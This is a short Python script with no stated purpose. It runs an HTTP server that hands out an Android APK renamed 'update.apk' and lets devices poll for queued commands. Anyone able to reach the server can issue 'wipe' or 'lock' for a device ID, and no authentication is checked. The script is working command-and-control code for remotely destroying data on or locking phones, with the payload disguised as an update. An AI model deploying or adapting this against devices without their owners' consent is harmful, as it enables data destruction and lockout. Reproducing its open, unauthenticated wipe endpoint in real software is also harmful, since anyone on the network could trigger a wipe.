#!/usr/bin/env python3
import os
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

APK = "app-debug.apk"
QUEUE = {}
SEEN = {}

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _send(self, code, body, ctype="text/plain; charset=utf-8"):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def do_GET(self):
        u = urlparse(self.path); p = u.path; q = parse_qs(u.query)
        if p == "/apk":
            if os.path.exists(APK):
                data = open(APK, "rb").read()
                self.send_response(200)
                self.send_header("Content-Type", "application/vnd.android.package-archive")
                self.send_header("Content-Disposition", 'attachment; filename="update.apk"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self._send(404, "apk missing\n")
        elif p == "/cmd":
            dev = (q.get("id") or ["?"])[0]
            SEEN[dev] = datetime.now().isoformat(timespec="seconds")
            cmd = QUEUE.pop(dev, "none")
            print(f"[{SEEN[dev]}] poll {dev} -> {cmd}", flush=True)
            self._send(200, cmd)
        elif p in ("/wipe", "/lock"):
            dev = (q.get("id") or [""])[0]
            if dev:
                QUEUE[dev] = p.strip("/")
                self._send(200, f"{p.strip('/')} queued for {dev}\n")
            else:
                self._send(400, "need ?id=\n")
        elif p == "/list":
            out = ["devices:"]
            for d, t in SEEN.items():
                out.append(f"  {d}  last={t}  pending={QUEUE.get(d,'-')}")
            self._send(200, "\n".join(out) + "\n")
        else:
            self._send(200, "ok\n")

ThreadingHTTPServer(("0.0.0.0", 8080), H).serve_forever()
